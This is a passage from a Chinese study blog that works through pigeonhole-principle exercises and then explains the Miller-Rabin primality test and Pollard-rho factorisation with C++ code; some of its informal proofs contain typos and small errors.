class="math inline">\(\frac{1}{2}\)</span>
  (b)证明：在边长为1的等边三角形中任意选择10个点存在两个点，期间距至多为<span
class="math inline">\(\frac{1}{3}\)</span>   (c
)证明：在边长为1的等边三角形中任意选择m个点存在两个点，期间距至多为<span
class="math inline">\(\frac{1}{n}\)</span>
 26.设军乐团的mn个人一下述方式站成一m行n列的方队；在每一行中的每一个人都比他或她左边的人高。假设指挥官将每一列的人按身高从前至后增加的顺序排列。证明：各行仍是按照身高从左到右增加的顺序排列。
 28.在一次舞会上有10位男士和20位女士。对于1，2，...，100中的每个i，第i位男士选择<span
class="math inline">\(a_{i}\)</span>位女士作为他的潜在舞伴(这<span
class="math inline">\(a_{i}\)</span>女士组成他的“舞伴清单”)，这样，对任意给定的一组20位男士与20位女士配成舞伴对，且每位男士索赔的舞伴都在他的舞伴清单中。保证和一点的最小和<span
class="math inline">\(\sum_{i=1}^{100}a_{i}\)</span>是多少.</p>
###
<center>
证明如下
 4.两个数相差1，如果用鸽巢原理的话，他么可以说是两个数有什么相同的性质，在同一个鸽笼里，我们写成表达式就是
<center>
<span class="math inline">\(a-b=1\)</span>
<center>
<p><span class="math inline">\(b=a-1\)</span></p>
<p>于是我们可以利用这个“<span
class="math inline">\(=\)</span>”号来进行构建每一个鸽巢的性质，
设取出来的数为<span
class="math inline">\(a_{1},a_{2}......a_{n+1}\)</span>我们构造元素<span
class="math inline">\(b_{i}=a_{i}-1\)</span>这样就得到了2n+2个数，这些数的范围<span
class="math inline">\(b_{i}\)</span>最小为0，<span
class="math inline">\(a_{i}\)</span>最大为2n，所以集合<span
class="math inline">\(A=[0,1,2....2n]\)</span>中共有2n+1个数，我么构造了2n+2个数归入集合A中必有两个数在一个元素中，于是必有<span
class="math inline">\(a_{i}=b_{j}+1\)</span>存在。</p>
 5.这个题应该注意对题目的理解，他的目的是证明一定存在最多差二的情况，而不是所有数的差最大为2，那么证明过程和上面类似，我们翻译一下最多相差2，就是存在相差1<strong>或</strong>相差2的，进行下列构造
<center>
<span class="math inline">\(b_{i}=a_{i}-1\)</span>
<center>
<p><span class="math inline">\(c_{i}=a_{i}-2\)</span></p>
<p>可以知道<span
class="math inline">\(a_{i},b_{i},c_{i}\)</span>的取值范围为<span
class="math inline">\([-1,3n]\)</span>共3n+2个数，而我们构造的数有3n+3个，所以必有两个相等。</p>
 7.两个数能被100整除说明这两个数又到同一个“鸽笼”里面去了，对于除法，我们不妨对所有数取<span
class="math inline">\(mod100\)</span>，这样的话所有数都可以分为100类，两个数相加可以被<span
class="math inline">\(100\)</span>整除我们可以知道他们的模应该是这样的
<center>
<span class="math inline">\(x=amod(100)\)</span>
<center>
<p><span class="math inline">\(y=bmod(100)\)</span></p>
两个数相加表示为
<center>
<p><span class="math inline">\(x+y==100||x+y==0\)</span></p>
两个数相减 表示为
<center>
<p><span class="math inline">\(x==y\)</span></p>
<p>现在将可以完成上述配对的元素组成一个数对，于是我么可以构造一个集合A={<span
class="math inline">\((a_{i1},a_{i2})\)</span>|,a_{i1}+a_{i2}==100}+{(0,0)}
直观的写就是{(0,0),(1,99),(2,98).....(50,50)}，里面的每个数都是所有数mod（100）后的结果，对于每个实数对中例如（2，98），如果两个元素共同出自这里，要么他们相同即都是2或98，这时二者相减所得可被100整除，要么是2和98，这时二者相加也可被00整除，这样的数对共有51个，取出52个数后，必有两个在一个元素中，命题得证。</p>
 8.首先有循环一定是除法过程中部分的被除数（我也不知道叫啥）有了循环除法就是像现在写的那样，我们假设除数为n，被除数为m，<span
class="math inline">\(b_{i}\)</span>为中间被除数，<span
class="math inline">\(a_{i}\)</span>为我们常说的商，那么
<center>
<p><span class="math inline">\(\left\{\begin{matrix}
m=a_{1}n+b_{1}，b_{1}=m mod(n)\\
b_{1}=a_{2}n+b_{2}，b_{2}=b_{1}mod(n)\\
b_{2}=a_{3}n+b_{3}，b_{3}=b_{2}mod(n)\\
.\\
.\\
.\\
b_{n}=a_{n}n+b_{n+1}, b_{n+1}=b_{n}mod(n)\\
.\\
.\\
.\\
\end{matrix}\right.\)</span></p>
<p>因为是无限循环所以必然能使得<span
class="math inline">\(b_{n}\)</span>出现，由于由于<span
class="math inline">\(b_{i}\)</span>为对n取m的结果，所以<span
class="math inline">\(b_{i}\in[0,n-1]\)</span>，而<span
class="math inline">\(b_{i}\)</span>多余n个，所以<span
class="math inline">\(b_{i}\)</span>最终会循环，这也导致了<span
class="math inline">\(a_{i}\)</span>循环，于是商就循环了</p>
<p> 9.上来的时候我们理解错题意了，所以我先为各位纠正一下题意，他的意思就是选两个相交后是空集<strong>但是他们的并集并不一定是全集</strong><del>(我就在这里理解错了)</del>
的集合  (1)<span
class="math inline">\(10\)</span>个数哦我们可以选择的非空集合有<span
class="math inline">\(2^{10}-1=1023\)</span>个但是每一个集合的年龄和的范围为<span
class="math inline">\([10,600]\)</span>共590个元素,所以必有两个集合的值相同，这两个集合中的元素可能相同，不符合题意，但完全没有关系，我们可以将两个集合中的元素去重，去重后两个集合人年龄和仍然相同，也许你会问去重后两个集合中有没有一个为空集，答案是不会的，因为如果得到空集的话，非空集的年龄和就为零，但是年龄最小值为1，所以不会有空集。
 (2)如果<span class="math inline">\(n&lt;10\)</span>那么集合个数是<span
class="math inline">\(2^n-1\leq{n*(60-1)}\)</span>,所以我们无法使用鸽巢原理证明有两种集合的元素值相等。（不等式我没有证明，但是在n==9的时候是成立的，<del>应该可以用数学归纳法吧！</del>）</p>
 10.7周共49天，一周不能超过11小时，则7周不能超过77小时，如果将看电视时间视为一个序列<span
class="math inline">\(a_{i}\)</span>,那么题中指出的就是要寻找连续和为20的情况，设：
<center>
<p><span class="math inline">\(s_{i}=\sum_{k=1}^{i}a_{k}\)</span></p>
那么从第i天到第j天的和为<span
class="math inline">\(s_{j}-s_{i-1}\)</span>，换句话说我们要找到两个数<span
class="math inline">\(s_{i}\)</span>和<span
class="math inline">\(s_{j}\)</span>使得
<center>
<p><span class="math inline">\(s_{i}=s_{j}+20\)</span></p>
<p>于是我们构造元素<span
class="math inline">\(s_{i}+20\)</span>,那么元素<span
class="math inline">\(s_{i},s_{i}+20\)</span>组成的集合取值范围为<span
class="math inline">\([49,77+20]\)</span>,共有48个值，而我们有<span
class="math inline">\(2\times49=98\)</span>个元素所以必有两个i，j使得<span
class="math inline">\(s_{i}=s_{j}+20\)</span>。</p>
<p> 11.我就不写了......你可以看看第10题（* ---- *）</p>
<p> 13.（待更新）</p>
<p> 14.这个也太简单了吧，你可能心里都知道答案，也许不知道怎么用鸽巢原理，我来提示一下，<span
class="math inline">\(X_{苹果}+X_{香蕉}+X_{橘子}+X_{梨}=(4\times(ans-1))+1\)</span>，其中ans是我们要拿的元素个数，<span
class="math inline">\(X_{水果}\)</span>是个数，所以答案是45;</p>
 15.这个问题也是十分的简单，依旧是先将等式化简一下
<center>
<span class="math inline">\(a_{i}-a{j}\equiv0mod(n)\)</span>
<center>
<p><span class="math inline">\(a_{i}\equiv a_{j}mod (n)\)</span></p>
<p>接下来的鸽巢原理就好做了我们设<span
class="math inline">\(b_{i}=a_{i}mod(n)\)</span>于是<span
class="math inline">\(b_{i}\in[0,n-1]\)</span>一共有n+1个<span
class="math inline">\(b_{i}\)</span>但是取值有n个，所以必有<span
class="math inline">\(b_{i}\equiv b_{i}mod(n)\)</span>，命题得证
 16.在以上几个题中这个应该是一个新问题了，设每个人的序列s为<span
class="math inline">\(a_{1},a_{2}……a_{n}\)</span>每个元素的取值范围为[0,n-1],根据<a
href="https://www.cnblogs.com/zywscq/p/4819978.html">Havel-Hakimi</a><a
href="#fn1" class="footnote-ref" id="fnref1"
role="doc-noteref"><sup>1</sup></a>我们可以知道这个这个序列不可能为0,1,2……n-1,所以不能同时有n个不同值出现在序列里，根据鸽巢原理必有两值相等。<strong>最后补充一点，使用Havel-Hakimi是因为我们涉及到要把题中的条件转化到我们的证明中，由于遇到的是图论，我们所设的序列受到无向图的限制，所以要加上的一些判断，在后面的题中我们依然能遇到</strong></p>
<p> 17.又是道图论的题(我无法解释为什么偶数的时候没用Havel-Hakimi),由于都是偶数,所以只有(98,96,.....0)共50个数,设度数(认识人个数)序列为<span
class="math inline">\(a_{1},a_{2}......a_{n}\)</span>我们分几种情况讨论
  情况1:某个偶数在序列中只出现一次,那么序列中剩余的99个数被赋上49个值必然会出现3个数同值
  情况二:没有数在序列中只出现一次或者多余两次,这句话只能有一种情况符合,就是序列(0,0,2,2,4,4,......98,98)所有偶数值都出现了两次,但这种情况不会出现,因为有两个数值为0,意味着有两个人谁都不认识,所以一个人最多认识<span
class="math inline">\(99-2=97\)</span>个人,但序列中存在98个人,于是这种情况不成立,
情况二的反面就是"<strong>存在数在序列中出现一次或大于等于三次</strong>",根据情况一我们知道有数字在序列出现一次必有其他数出现大于等于三次,命题得证</p>
<p> 18.在正方形中最远的距离就是对角线距离,我们可以反推存在两个点相距<span
class="math inline">\(\sqrt{2}\)</span>那么说明这两个点可能在同一个<span
class="math inline">\(1\times1\)</span>正方形中,现在看题并翻译,题目中要求在<span
class="math inline">\(2\times2\)</span>的正方形中放置5个点使得他们有两个点在同一个<span
class="math inline">\(1\times1\)</span>正方形中,于是我们将正方形分成4个<span
class="math inline">\(1\times1\)</span>正方形,根据鸽巢原理,必有两个点在一个正方形内部,证明结束</p>
<p> 19这题有三个小问,我就分着给大家答.
(a)这和18题是一样的,三角形中最远的两点距离就是边的距离(怎么找的,你可以想象作圆,由于等边三角形在三个点出的情况是对称的,所以选择一点作圆,例如顶点(我也不知道我为啥想的是顶点,如果你有证法不妨发给我看^
_
^)就能发现到达两边的距离最大),然后根据这些将三角形分割(<strong>注意不是因为题目给出三角形我们就分成三角形,我们可以分成圆形,分成正方形,但是分成别的形状就不能进行密铺,导致有些形状我们要进行特殊关注,造成麻烦</strong>)
(b)同上 (c
)就是道推导题,我们只要知道了过程知道关键在哪就能反推回去,我就不写了吧!</p>
<p>我没有学完Ramsey定理,所以这部分题先不做了吧!</p>
 26.<strong>这道题我没有办法用鸽巢原理,如果有人知道请告诉我</strong>,考虑两列的情况，两列这个问题等价于另一问题——==“第一列按顺序给出，第二列第i行元素都大于第一列的i行元素，证明第二里元素序排列后满足，同行内两元素前一个小于后一个”==
我们把这个问题叫做<strong>问题A</strong>，问题简单的了起来，如果新得出的问题得证，那在mn的情况下我们使用归纳法：
  (1)初始：对第一列排序，第二列得排序结果依然维持着在两列中每行第一个元素小于第二个元素;
  (2)归纳：对第i列排序，第i+1列得排序结果依然维持着在两列中每行第一个元素小于第二个元素;（原因是问题A已经被证出来了）
 那么下面就证明一下问题A，我的证明方法是利用递归，先将<span
class="math inline">\(a_{i}\)</span>有序给出，然后将对应的<strong>无序</strong><span
class="math inline">\(b_{i}\)</span>给出来，我们把<strong>情况B(n)</strong>
记作”在规模为n时至少有n-i+1个<span
class="math inline">\(b_{i}\)</span>数大于等于<span
class="math inline">\(a_{i}\)</span>“，原因是不等式（数轴可能会直观些)
<center>
<p><span class="math inline">\(\left\{\begin{matrix}  a_{i}\leq
b_{i}\\a_{i}\leq a_{i+1}\leq b_{i+1}\\.\\.\\.\\a_{i}\leq a_{n}\leq
b_{n}\end{matrix}\right.\)</span></p>
<p>下面我们使用递归   从最后一个元素<span
class="math inline">\(a_{n}\)</span>开始，我们从大于<span
class="math inline">\(a_{n}\)</span>的<span
class="math inline">\(b_{i}\)</span>中能够找出最大的一个记作<span
class="math inline">\(c_{n}\)</span>，根据不等式关系<span
class="math inline">\(c_{n}\)</span>一定是<span
class="math inline">\(b_{i}\)</span>中最大的一个，且满足<span
class="math inline">\(c_{n}\geq
a_{n}\)</span>从b序列中剔除选出的数字，现在的结论是大于<span
class="math inline">\(a_{i}\)</span>的<span
class="math inline">\(b_{j}\)</span>个数比原来的小1（因为最大的没了），那么，大于<span
class="math inline">\(a_{i}\)</span>的<span
class="math inline">\(b_{j}\)</span>个数至少为n-i也就相应成立，将<span
class="math inline">\(a_{n}\)</span>除掉我们发现这个问题由”情况B(n)“变为了情况”B(n-1)“，最终完成情况B(1)，这个时候得到的<span
class="math inline">\(c\)</span>是b的有序序列，且满足<span
class="math inline">\(a_{i}\leq c_{i}\)</span></p>
  当然问题A还有一种证法，群友张晴川大佬(大佬轻松的就证出来了)提供了这样的思路,先进行证明<span
class="math inline">\(2\times2\)</span>的情况,
<center>
<p><span class="math inline">\(\begin{bmatrix}
a_{1}&amp;b_{1}\\
a_{2}&amp;b_{2}\\
\end{bmatrix}\)</span></p>
第一列依然是有序的，在这两列数中满足<span
class="math inline">\(a_{i}&lt;b_{i}\)</span>，经过分类讨论（<span
class="math inline">\(b_{i}\)</span>正序还是倒序）很容易证明当对<span
class="math inline">\(b_{i}\)</span>排序后依然满足某行内顺序，那么对于
<center>
<p><span class="math inline">\(\begin{bmatrix}
a_{1}&amp;b_{2}\\a_{2}&amp;b_{2}\\.&amp;.\\.&amp;.\\a_{n}&amp;b_{n}\\
\end{bmatrix}\)</span></p>
<p>在这两列中找出存在<span
class="math inline">\(b_{i}\)</span>最大的那行与最后一行构成一个<span
class="math inline">\(2\times2\)</span>的矩阵进行排序（如果找到的那行不是最后一行
那么得到的两行进行排序就是将<span
class="math inline">\(b_{i}\)</span>与<span
class="math inline">\(b_{n}\)</span>进行交换）依然满足行内前一元素大于后一元素，现在b中最大元素与a中最大元素在一起了，去掉最后一行那么问题的规模就变成了n-1，接下来递归求解就行了。</p>
<p>  28.假设<span
class="math inline">\(a_{i}\)</span>是男人名单上女人的个数<span
class="math inline">\(b_{i}\)</span>是女人名单上男人的个数，那么由<span
class="math inline">\(\sum_{i=1}^{20}b_{i}=\sum_{j=1}^{100}a_{j}\)</span>当存在<span
class="math inline">\(b_{i}\leq
80\)</span>时会有20名男性不在它的名单上，选出那20位男性，他们最多能有19人与女性配对不服题意，当<span
class="math inline">\(b_{i}\geq81\)</span>时<span
class="math inline">\(\sum_{j=1}^{100}a_{j}\geq1620\)</span>,在和为1620的情况下有符合题意的分配，有80个男人他们的表上有20个女人，剩余20个男人表上一人分配一个女人，且这二十个人每个人都不会重复。（这道题用鸽巢原理的话应该是这样，先证明1620的分配好使，在证明<span
class="math inline">\(\sum_{i=1}^{20}b_{i}&lt;1620\)</span>的时候有<span
class="math inline">\(b_{i}\leq80\)</span>,上面已经证明<span
class="math inline">\(b_{i}\leq80\)</span>是不符合题意的）</p>
<p> </p>
<p> </p>
<p> 会的都写上了，剩下的几道题不是没想出来，就是连题都不知道要干嘛
，有兴趣的同学可以评论中给我些提示</p>
<section id="footnotes" class="footnotes footnotes-end-of-document"
role="doc-endnotes">
<hr />
<ol>
<li id="fn1"><p>其递归定义为：由非负整数组成的非增序列<span
class="math inline">\(s_{度}\)</span>：<span
class="math inline">\(d_{1}，d_{2}，…，d_{n}（n\geq2，d_{1}\geq1）\)</span>是可图的，当且仅当序列：<span
class="math inline">\(s_{1}:d_{2}– 1，d_{3}– 1，…，d_{d1+1} –
1，d_{d1+2}，…，d_{n}\)</span>是可图的<a href="#fnref1"
class="footnote-back" role="doc-backlink">↩︎</a></p></li>
</ol>
</section>
]]></content>
  </entry>
  <entry>
    <title>质数相关概率算法</title>
    <url>/2024/01/22/%E8%B4%A8%E6%95%B0%E7%9B%B8%E5%85%B3%E6%A6%82%E7%8E%87%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h1 id="miller-rabin快速判断质数">Miller Rabin快速判断质数</h1>
<p><a href="https://zhuanlan.zhihu.com/p/646602750">参考</a> <a
href="https://www.cnblogs.com/Miracevin/p/9697260.html">参考</a></p>
<p>主要使用费马小定理。<br />
费马小定理如下：若P为质数，则有如下表达式。 <span
class="math display">\[
a^{P - 1}=1(mod\ P)
\]</span></p>
<p>  但是，这个定理的否定是不成立的。即如下说法<strong>不成立</strong>，“若P为合数，则<span
class="math inline">\(a^{P - 1} \neq 1(mod\ P)\)</span>”,
也就是说，P为合数时也有一定概率导致<span class="math inline">\(a^{P -
1}=1(mod\ P)\)</span>。</p>
<p>一个命题的逆否命题与原命题同真假，所以当<span
class="math inline">\(a^{P - 1}\neq
1(mod(P))\)</span>时，P必然为合数。</p>
<p>由上述可知P满足<span class="math inline">\(a^{P - 1}=1(mod\
P)\)</span>，并不可以说明P为质数，但是如果对多个a成立，那么P为质数的可能行就大大增加，所以可以选取一些a来做质数筛选。</p>
<p>底数a的选择一般如下：<br />
当<span class="math inline">\(P \leq 2^{32}\)</span>时，<span
class="math inline">\(a\in{2,7,61}\)</span><br />
当<span class="math inline">\(P \leq 2^{64}\)</span>时，<span
class="math inline">\(a\in{2,325,9375,28178,450775,9780504,1795265022}\)</span><br />
当<span class="math inline">\(P \leq 2^{78}\)</span>时，<span
class="math inline">\(a\in{2,3,5,7,11,13,17,19,23,29,31,37}\)</span></p>
<p>一个加速的方法，已知<span class="math inline">\(a^{2} mod(p) =
1\)</span>则有 <span class="math display">\[
\begin{align*} (a^{2} - 1) mod(p) &amp;= 0 \\ (a + 1)(a - 1)mod(p)
&amp;= 1 \end{align*}
\]</span></p>
<p>如果p为质数，由于质数不能进行再次分解，于是会<span
class="math inline">\((a + 1)mod(p) = 0\)</span>或<span
class="math inline">\((a - 1)mod(p) =
0\)</span>成立，这就是二次探测定理：</p>
<p>  若p为质数，且<span
class="math inline">\(a^{2}mod(P)=1\)</span>，则<span
class="math inline">\(a\ mod(p) = \pm 1\)</span> 。</p>
<p>有了这个定理，在计算<span class="math inline">\(a^{p - 1}
mod(p)\)</span>时，设<span class="math inline">\(p - 1 =
2^{k}t\)</span>，<span class="math inline">\(v =
a^{t}\)</span>，由于p是偶数时不用判断，p为奇数时必然有<span
class="math inline">\(k \geq 1\)</span>，之后计算k次<span
class="math inline">\(v_{new} = v^{2} mod(p),v =
v_{new}\)</span>，当<span class="math inline">\(v_{new} ==
1\)</span>时必然有<span class="math inline">\(v = 1 || v = p -
1\)</span>，否则说明p不是质数。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ll long long </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> lll __int128</span></span><br><span class="line"><span class="function">ll <span class="title">mul</span><span class="params">(ll a,ll b,ll mod)</span></span>&#123;</span><br><span class="line">  ll ans = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span>(b)&#123;</span><br><span class="line">    <span class="keyword">if</span>(b &amp; <span class="number">1</span>)ans = ((lll)ans * (lll)a) % (lll)mod;</span><br><span class="line">    a = ((lll)a * (lll)a) % ((lll)mod);</span><br><span class="line">    b /= <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">is_prime</span><span class="params">(ll x)</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(x == <span class="number">1</span>)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">if</span>(x % <span class="number">2</span> == <span class="number">0</span>)<span class="keyword">return</span> x == <span class="number">2</span>;</span><br><span class="line">  vector&lt;<span class="type">int</span>&gt;b&#123;<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">17</span>,<span class="number">23</span>,<span class="number">29</span>,<span class="number">31</span>,<span class="number">37</span>,<span class="number">61</span>,<span class="number">24251</span>&#125;;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; b.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(x == b[i])<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  ll k = x - <span class="number">1</span>;</span><br><span class="line">  ll t = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span>((k &amp; <span class="number">1</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">    k /= <span class="number">2</span>;</span><br><span class="line">    t++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; b.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">    ll v = <span class="built_in">mul</span>(b[i],k,x);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; t;i++)&#123;</span><br><span class="line">      ll next_v = ((lll)v * (lll)v) % (lll)x;       </span><br><span class="line">      <span class="keyword">if</span>(next_v == <span class="number">1</span>)&#123;      <span class="comment">//当前值为1，则检查上一次值是否为1或者x - 1，不成立说明x不是质数</span></span><br><span class="line">        <span class="keyword">if</span>(v != x - <span class="number">1</span> &amp;&amp; v != <span class="number">1</span>)</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        v = next_v;         <span class="comment">// 后面无需判断，后面都是1</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v = next_v;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(v != <span class="number">1</span>)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="pollard-roh快速因式分解">pollard-roh快速因式分解</h1>
<p><a
href="https://czicz.cn/2020/09/03/pollard-rho-suan-fa/">重要参考1</a><br />
<a href="https://zhuanlan.zhihu.com/p/267884783">重要参考2</a><br />
<a
href="https://www.studocu.com/row/document/changsha-university-of-science-and-technology/computer-algorithm/pollard-rho%E7%AE%97%E6%B3%95%E8%AF%A6%E8%A7%A3-changsha-university-of-science-and-technology/26399430">参考</a><br />
<a
href="https://blog.csdn.net/qq_26131031/article/details/124135869">参考3</a></p>
<p>对这个算法参考了诸多资料后才明白处理过程以及原因，感谢以上作者。</p>
<ol type="1">
<li>朴素算法 以往进行因式分解的算法时间复杂度为<span
class="math inline">\(O(\sqrt{n})\)</span>，算法如下：</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> P;  <span class="comment">// 要分解的数</span></span><br><span class="line">cin&gt;&gt;P;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">2</span>;i*i &lt;= P ;i++)&#123;</span><br><span class="line">    <span class="keyword">while</span>(P % i == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">/*相关统计放在这里*/</span></span><br><span class="line">        P/=i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上述代码中i就是P的质因数，分解的时间为<span
class="math inline">\(\sqrt(n)\)</span>。</p>
<ol start="2" type="1">
<li>概率优化 于是呢，有人想能不能将这个过程使用概率做 <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> P;  <span class="comment">// 要分解的数</span></span><br><span class="line">    cin&gt;&gt;P;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">get_factor</span><span class="params">(<span class="type">int</span> P)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">isprim</span>(P))&#123;</span><br><span class="line">        <span class="keyword">return</span> P;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">2</span> + (<span class="built_in">rand</span>() % (<span class="built_in">sqrt</span>(P) - <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span>(P % ans == <span class="number">0</span>)<span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
假如因子为q，那么在<span
class="math inline">\([2,\sqrt{n}]\)</span>中寻找q的概率为<span
class="math inline">\(\frac{1}{\sqrt{n} - 1}\)</span>。期望在<span
class="math inline">\(\sqrt{n} -
1\)</span>次找到因子，和原先的算法时间复杂度差不多，而且概率方法时间复杂度难控制。<b><font color=red>注意</font></b>，这里质数判断算法采用Miller方法判断，可以在很短的时间内判断出质数。</li>
</ol>
<p>随机取出的数字可能和分解的目标存在公因子，为不让这次取值浪费，可以使用gcd来完成改进
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> P;  <span class="comment">// 要分解的数</span></span><br><span class="line">    cin&gt;&gt;P;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">get_factor</span><span class="params">(<span class="type">int</span> P)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">isprim</span>(P))&#123;</span><br><span class="line">        <span class="keyword">return</span> P;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="type">int</span> temp = <span class="number">2</span> + (<span class="built_in">rand</span>() % (P - <span class="number">2</span>);</span><br><span class="line">        <span class="type">int</span> ans = <span class="built_in">gcd</span>(temp,P);</span><br><span class="line">        <span class="keyword">if</span>(ans != <span class="number">1</span>)<span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这样的优化是的不光因子q可以让算法返回，2q,3q,4q,5q...都可以满足，使得中奖概率增大。但算法依旧有优化的空间。如果在枚举数字的时候，通过两次枚举，是否可以增加枚举出q的概率呢？</p>
<p>答案是对的，x1、x2为随机枚举的数字，|x2 -
x1|作为最终枚举的结果，那么枚举出q的概率为<span
class="math inline">\(\frac{2P}{P^{2}} =
\frac{2}{P}\)</span>，因为对于任意一数x1，|x2 - x1| ==
q的x2有两个。可见两次枚举就使得概率增大了。这个原理和生日悖论有关：</p>
<ol start="3" type="1">
<li>生日悖论</li>
</ol>
<p>生日悖论可以表述为：“一个房间里有23个人，则他们中有两人生日相同的概率超过一半”，证明通过不等式即可：<br />
k个人中所有人生日都不一样的概率为： <span class="math display">\[
p(k) = \frac{A_{k}^{365}}{365^{k}} = \frac{365}{365} \times \frac{365 -
1}{365} \times ... \times \frac{365 - k + 1}{365}
\]</span> 所以k个人中存在生日一样的人概率为1-p{k}</p>
<p>使用不等式<span class="math inline">\(1 + x &lt;
e^{x}\)</span>将p(k)上界得出 <span class="math display">\[
\begin{align*}
p(k) &amp;= \frac{365}{365} \times \frac{365 - 1}{365} \times ... \times
\frac{365 - k + 1}{365}\\
     &amp;= 1 \times (1 - \frac{1}{365}) \times (1 -
\frac{2}{365})\times ... \times (1 - \frac{k - 1}{365})
     &amp;\leq e^{\frac{0 - 1 - 2 - 3 .... - (k - 1)}{365}}
\end{align*}\]</span></p>
<p><span class="math display">\[
1 - p(k) \geq 1 - e^{\frac{-k(k-1)}{730}}
\]</span></p>
<p>当1-p(k)的下线超过50%时，k = 23。</p>
<p>生日悖论告诉我们，只要在某个范围内不断的生成随机数，很快就会得到两个模相等的数。</p>
<ol start="4" type="1">
<li>悖论优化</li>
</ol>
<p>  通过上面可以知道，如果随机取很多个<span class="math inline">\(x =
{x_{1},x_{2},...,x_{s}}\)</span>，那么对任意i、j、q，当s越大<span
class="math inline">\((x_{i} - x_{j})\ mod\ q =
0\)</span>越容易成立（p看做一年时间，x看做生日）。如果P因子为q，那么gcd(|x_{i}
-
x_{j}|,P)很容易得到因子q。已有论文已经证明为了能得到因子，枚举的数量要在<span
class="math inline">\(O(P^{\frac{1}{4}})\)</span>左右，才能得到因子。如果对这P^{1/4}个数两两作差然后计算gcd，时间复杂度变为<span
class="math inline">\(O((P^{\frac{1}{4}})^{2}
log_{2}P)\)</span>，其中<span
class="math inline">\(log_{2}\)</span>是由gcd计算产生的。这样的方法必然会退化，所以必须牺牲一些东西来换取另一些东西。</p>
<p>  显然数的两两组合会导致效率降低，所以索性就减少两两组合的次数，相应的会降低找到因子q的概率，pollard-roh找到了一种较优的策略，以下是我个人理解。</p>
<p>  pollard-roh使用伪随机数，利用<span class="math inline">\(f(x) =
(x^{2} + c) % P\)</span>生成所需随机数列，所生成数列有两个性质</p>
<ul>
<li>生成序列最终会发生循环</li>
<li><span class="math inline">\(f(x) - f(y)\ mod(x - y) = (x^{2} -
y^{2})\ mod(x - y) = (x + y)(x - y) \ mod(x - y) = 0\)</span></li>
</ul>
<p>  第一个特点决定了随机数生成一定时间之后会发生重复，所以需要再次进行生成。<br />
  第二个特点则表示数列<span class="math inline">\(x =
{x_{1},x_{2},...,x_{s}}\)</span>中下标差一样的两个数字含有相同因子，所以某一下标差相等的两元素做完gcd之后，其他元素可以不做（但这并不代表其他下标差一致的元素与P做gcd操作后依旧可能会产生不为1的结果,因为观察上面的式子中，f(x)
- f(y)中还有因子(x +
y)）。为了能让算法能取到不同下标差的元素，同时还能检测是否出现环，这时需要借用Flody判圈法。</p>
<p>  flody判圈中一个经典的思路就是两个指针，一个快速每次前进2单位，一个慢速每次前进1单位。放在这里刚好，快速的指针-慢速的指针下标差刚好可以遍历完所有下标差，同时通过快慢指针可以知道发生循环的时刻。代码如下：</p>
